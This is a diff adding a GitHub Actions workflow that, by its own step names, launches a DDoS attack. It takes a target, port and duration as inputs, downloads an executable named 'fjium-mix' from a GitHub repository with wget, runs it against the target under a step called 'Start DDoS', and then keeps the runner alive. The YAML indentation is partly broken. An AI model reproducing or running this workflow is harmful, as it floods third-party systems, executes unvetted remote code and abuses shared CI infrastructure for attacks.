@@ -1,0 +1,42 @@
+name: mix
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        required: true
+        type: string
+      time:
+        description: 'Thời gian tấn công (giây)'
+        required: true
+        default: '300'
+        type: string
+      port:
+        required: true
+        default: '22'
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    timeout-minutes: 300
+    steps:
+      - uses: actions/setup-node@v4
+      with:
+        node-version: 20
+
+ - uses: actions/setup-python@v5
+      with:
+        python-version: '3.11'
+
+ - name: Download tools
+      run: |
+        wget -q https://github.com/112jb/mlonghehe/blob/main/fjium-mix
+        chmod +x *
+
+ - name: Start DDoS
+      run: |
+        ./fjium-mix ${{ inputs.target }} ${{ inputs.port }} ${{ inputs.time }}
+
+ - name: keep
+      run: |
+        echo "Keeping workflow alive for ${{ inputs.time }} seconds..."
+        sleep ${{ inputs.time }}
